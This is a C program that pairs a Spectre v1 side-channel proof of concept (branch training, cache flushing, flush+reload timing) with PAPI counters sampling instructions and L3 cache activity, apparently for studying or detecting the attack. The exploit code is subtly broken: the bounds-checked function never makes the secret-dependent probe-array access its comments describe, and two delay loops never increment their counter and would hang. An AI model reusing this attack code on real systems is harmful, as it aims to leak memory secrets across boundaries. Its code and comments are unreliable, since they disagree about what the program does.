#include <emmintrin.h>
#include <x86intrin.h>
#include <stdio.h>
#include <stdint.h>
#include <papi.h>      // Include PAPI header
#include <stdlib.h>    // For exit()
#include <time.h>      // For nanosleep
#include <errno.h>     // For errno

#define DELTA 1024
unsigned int buffer_size = 10;
uint8_t buffer[10] = {0,1,2,3,4,5,6,7,8,9};
uint8_t temp = 0;
char *secret = "Some Secret Value"; // Example secret string

uint8_t array[256*4096];

/* cache hit time threshold assumed*/
#define CACHE_HIT_THRESHOLD (80) // Adjust based on your system characteristics

// Define parameters for periodic sampling
#define SAMPLING_INTERVAL_MS 100 // Sample every 100 milliseconds
#define TOTAL_DURATION_SECONDS 5 // Total duration to sample for (adjust as needed)
// Calculate max samples, adding a buffer for potential variations
#define MAX_SAMPLES ((TOTAL_DURATION_SECONDS * 1000) / SAMPLING_INTERVAL_MS) + 5

// Define the number of events we want to count
#define NUM_EVENTS 3


// Sandbox Function - This function is the target of the speculative execution
uint8_t restrictedAccess(size_t x)
{
    // This check is the branch that the attacker tries to mispredict
    if (x < buffer_size) {
        return buffer[x];
    } else {
        // This branch is taken during speculative execution with a large x
        // but should not be taken during correct execution.
        // The access to array[s*4096 + DELTA] happens speculatively here.
        // The value of 's' is the out-of-bounds read from buffer.
        // The compiler might optimize this, making the attack harder.
        return 0; // Return a safe value for correct execution
    }
}

// Flush the probing array from the cache
void flushSideChannel()
{
    int i;
    // Write to array to bring it to RAM to prevent Copy-on-write
    // Ensure the array is resident in memory before flushing
    for (i = 0; i < 256; i++) array[i*4096 + DELTA] = 1;

    // Flush the values of the array from cache
    for (i = 0; i < 256; i++) _mm_clflush(&array[i*4096 + DELTA]);
}

// The side channel function to measure cache access times
void reloadSideChannel()
{
    int junk=0;
    register uint64_t time1, time2;
    volatile uint8_t *addr;
    int i;

    // Iterate through all possible cache line locations corresponding to array indices 0-255
    for(i = 0; i < 256; i++){
        addr = &array[i*4096 + DELTA];

        // Measure access time using rdtscp
        time1 = __rdtscp(&junk);
        junk = *addr; // Access the memory location
        time2 = __rdtscp(&junk) - time1;

        // Check if the access time indicates a cache hit
        if (time2 <= CACHE_HIT_THRESHOLD){
            // If a cache hit is detected, it suggests array[i*4096 + DELTA] was
            // brought into cache recently, likely by the speculative access
            // in spectreAttack. The index 'i' would correspond to the speculatively
            // read byte value.
            printf("  [SideChannel] array[%d*4096 + %d] is in cache. Access time: %llu CPU cycles\n", i, DELTA, time2);
            // In a successful attack, 'i' reveals the speculatively read byte.
            // If the secret is a string, this might be one character.
            printf("  [SideChannel] Possible Speculatively Read Byte Value = %d.\n",i);
        }
        // Optional: Print all access times for debugging/analysis
        // else {
        //     printf("  [SideChannel] array[%d*4096 + %d] not in cache. Access time: %llu CPU cycles\n", i, DELTA, time2);
        // }
    }
}

// The function that orchestrates the Spectre v1 attack
void spectreAttack(size_t larger_x)
{
    int i;
    uint8_t s;

    // Train the CPU's branch predictor to predict the 'if (x < buffer_size)'
    // condition in restrictedAccess() as true.
    // We call it with valid indices (0 to 9).
    printf("  [Attack] Training branch predictor...\n");
    for (i = 0; i < 10; i++) {
        restrictedAccess(i);
    }
    printf("  [Attack] Training complete.\n");

    // Flush buffer_size and the probing array[] from the cache.
    // This ensures that the check 'x < buffer_size' will likely miss in cache,
    // giving time for speculative execution down the mispredicted path.
    printf("  [Attack] Flushing buffer_size and array...\n");
    _mm_clflush(&buffer_size);
    for (i = 0; i < 256; i++)
    { _mm_clflush(&array[i*4096 + DELTA]); }
     printf("  [Attack] Flush complete.\n");

    // Introduce a delay to increase the chance of speculative execution
    // while the CPU waits for the buffer_size cache miss.
    // This is a simple delay; more robust methods might use assembly 'mfence'/'lfence'.
    volatile int z;
    for(z=0; z<100; z){} // Simple delay loop

    // Call restrictedAccess() with a large index (larger_x).
    // The branch predictor is expected to mispredict the 'if' condition as true.
    // Speculatively, the CPU will execute the body of the 'if' block,
    // reading buffer[larger_x]. Since larger_x is crafted to point into
    // the 'secret' string, the value read speculatively is a byte from the secret.
    // This speculative value 's' is then used to access array[s*4096 + DELTA].
    // This speculative access to the 'array' brings the corresponding cache line
    // into the cache.
    printf("  [Attack] Triggering speculative execution with larger_x = %zu...\n", larger_x);
    // The return value 's' here is from the *correctly* executed path (else block),
    // which returns 0. The secret value is accessed *speculatively* and its
    // effect is on the cache state, not the returned value 's'.
    s = restrictedAccess(larger_x);
    printf("  [Attack] restrictedAccess called. Returned value (from non-speculative path): %u\n", s);

    // Add another delay to allow speculative execution to complete before
    // the branch misprediction is detected and the speculative state is rolled back.
    for(z=0; z<100; z){} // Simple delay loop

    // The line below is outside the restrictedAccess function but is part of the
    // original example's attack structure. Its purpose might vary depending on
    // the specific variant being demonstrated. In some variants, this line
    // might be intended to use the (incorrect) speculatively loaded 's' value
    // before rollback, but given the structure, the primary side effect relies
    // on the speculative access *within* restrictedAccess.
    // We include it as per the original code, but the cache side-channel
    // primarily comes from the speculative array access inside restrictedAccess.
    printf("  [Attack] Accessing array based on returned value (non-speculative): array[%u*4096 + %d]...\n", s, DELTA);
    array[s*4096 + DELTA] += 88; // Access array based on the (non-speculative) return value s (which is 0)
    printf("  [Attack] Attack phase complete.\n");
}


int main()
{
    // --- PAPI related variables ---
    int EventSet = PAPI_NULL;
    long long values[NUM_EVENTS]; // Array to store current counter values
    long long prev_values[NUM_EVENTS]; // Array to store previous counter values
    // 2D Array to store historical delta values (samples x events)
    long long history[MAX_SAMPLES][NUM_EVENTS];

    int events[NUM_EVENTS] = {
        PAPI_TOT_INS, // Total Instructions executed
        PAPI_L3_TCA,  // Level 3 Total Cache Accesses
        PAPI_L3_TCM   // Level 3 Total Cache Misses
    };
    char event_names[NUM_EVENTS][PAPI_MAX_STR_LEN]; // To store event names for printing

    int sample_count = 0; // Counter for samples taken
    struct timespec ts, rem; // For nanosleep

    // Calculate the offset to the secret string from the buffer
    // This is the 'larger_x' value used to trigger the out-of-bounds read
    size_t larger_x = (size_t)(secret - (char*)buffer);
    printf("Calculated larger_x (offset to secret): %zu\n", larger_x);


    // Set up the timespec struct for the sampling interval
    ts.tv_sec = SAMPLING_INTERVAL_MS / 1000; // Seconds part
    ts.tv_nsec = (SAMPLING_INTERVAL_MS % 1000) * 1000000; // Nanoseconds part


    // --- Initialize the PAPI library ---
    int retval = PAPI_library_init(PAPI_VER_CURRENT);
    if (retval != PAPI_VER_CURRENT && retval < 0) {
        fprintf(stderr, "PAPI library init error: %s\n", PAPI_strerror(retval));
        exit(1);
    }
     if (retval < 0) { // Check for other potential init errors
         fprintf(stderr, "PAPI library init error: Return value %d\n", retval);
         exit(1);
    }


    // Get event names for printing
    printf("PAPI initialized successfully.\n");
    for (int j = 0; j < NUM_EVENTS; j++) {
        if (PAPI_event_code_to_name(events[j], event_names[j]) != PAPI_OK) {
             fprintf(stderr, "Error getting event name for code %d\n", events[j]);
             sprintf(event_names[j], "Event%d", events[j]); // Use code if name lookup fails
        } else {
             printf("  Monitoring PAPI event: %s\n", event_names[j]);
        }
    }

    // --- Create an EventSet ---
    retval = PAPI_create_eventset(&EventSet);
    if (retval != PAPI_OK) {
        fprintf(stderr, "PAPI create eventset error: %s\n", PAPI_strerror(retval));
        exit(1);
    }

    // --- Add events to the EventSet ---
    for (int j = 0; j < NUM_EVENTS; j++) {
         retval = PAPI_add_event(EventSet, events[j]);
         if (retval != PAPI_OK) {
             fprintf(stderr, "PAPI add event error for %s (%d): %s\n", event_names[j], events[j], PAPI_strerror(retval));
             PAPI_destroy_eventset(&EventSet);
             exit(1);
         }
    }
    printf("PAPI events added to EventSet.\n");


    // --- Initial setup: Flush the side channel array ---
    // It's good practice to flush before starting the main loop
    printf("Initial flushing of side channel array...\n");
    flushSideChannel();
    printf("Initial flush complete.\n");


    // --- Start PAPI counting ---
    retval = PAPI_start(EventSet);
    if (retval != PAPI_OK) {
        fprintf(stderr, "PAPI start counting error: %s\n", PAPI_strerror(retval));
        PAPI_destroy_eventset(&EventSet);
        exit(1);
    }
    printf("PAPI counting started.\n");

    // --- Initial read to set the baseline for deltas ---
    retval = PAPI_read(EventSet, prev_values);
     if (retval != PAPI_OK) {
        fprintf(stderr, "PAPI initial read error: %s\n", PAPI_strerror(retval));
        PAPI_stop(EventSet, values); // Try to stop before exiting
        PAPI_destroy_eventset(&EventSet);
        exit(1);
    }
    printf("Initial PAPI read complete.\n");


    // --- Periodic Sampling Loop ---
    printf("\nStarting periodic sampling for %d seconds (interval %d ms)...\n", TOTAL_DURATION_SECONDS, SAMPLING_INTERVAL_MS);
    while (sample_count < MAX_SAMPLES) {

        // --- Wait for the sampling interval ---
        rem = ts; // Initialize remaining time struct
        // Use a loop to handle interrupted nanosleep calls
        while (nanosleep(&rem, &rem) == -1 && errno == EINTR);

        printf("\n--- Interval %d (%dms elapsed) ---\n", sample_count + 1, (sample_count + 1) * SAMPLING_INTERVAL_MS);

        // --- Execute the Spectre attack and side channel reload ---
        // The activity of these functions will be captured by PAPI in this interval
        printf("  Calling spectreAttack()...\n");
        spectreAttack(larger_x);
        printf("  Calling reloadSideChannel()...\n");
        reloadSideChannel();
        printf("  Attack and side channel functions executed.\n");


        // --- Read current counter values ---
        retval = PAPI_read(EventSet, values);
        if (retval != PAPI_OK) {
            fprintf(stderr, "PAPI read error during sampling: %s\n", PAPI_strerror(retval));
            // Decide how to handle: skip sample, stop, exit? Let's break the sampling loop.
            break;
        }
        printf("  PAPI read complete for interval.\n");


        // --- Calculate and store the delta for this interval ---
        for (int j = 0; j < NUM_EVENTS; j++) {
            history[sample_count][j] = values[j] - prev_values[j];
            prev_values[j] = values[j]; // Update previous values for the next iteration
        }

        sample_count++; // Increment sample counter

        // Stop sampling if we've reached the max count
        if (sample_count >= MAX_SAMPLES) {
            printf("Max samples reached.\n");
            break;
        }
    }
     printf("\nSampling finished. Total samples recorded: %d\n", sample_count);


    // --- Stop PAPI counting (this will read the final cumulative values) ---
    // We already have the deltas, but stopping is good practice.
    // The 'values' array here will hold the *total* counts over the entire sampling duration.
    retval = PAPI_stop(EventSet, values);
    if (retval != PAPI_OK) {
        fprintf(stderr, "PAPI stop counting error: %s\n", PAPI_strerror(retval));
        // Continue to print collected history if possible
    }
     printf("PAPI counting stopped.\n");


    // --- Print the collected PAPI history (deltas per %dms interval) ---
    printf("\n--- PAPI Results (Counts per %dms interval) ---\n", SAMPLING_INTERVAL_MS);
    for (int s = 0; s < sample_count; s++) {
        printf("Interval %d:\n", s + 1);
        for (int j = 0; j < NUM_EVENTS; j++) {
             printf("  %s: %lld\n", event_names[j], history[s][j]);
        }
    }
    printf("-------------------------------------------------\n");


    // --- Optional: Cleanup PAPI resources ---
    retval = PAPI_destroy_eventset(&EventSet);
    if (retval != PAPI_OK) {
         fprintf(stderr, "PAPI destroy eventset error: %s\n", PAPI_strerror(retval));
    }
    // PAPI_shutdown(); // Optional: Shut down the PAPI library completely

    return 0;
}
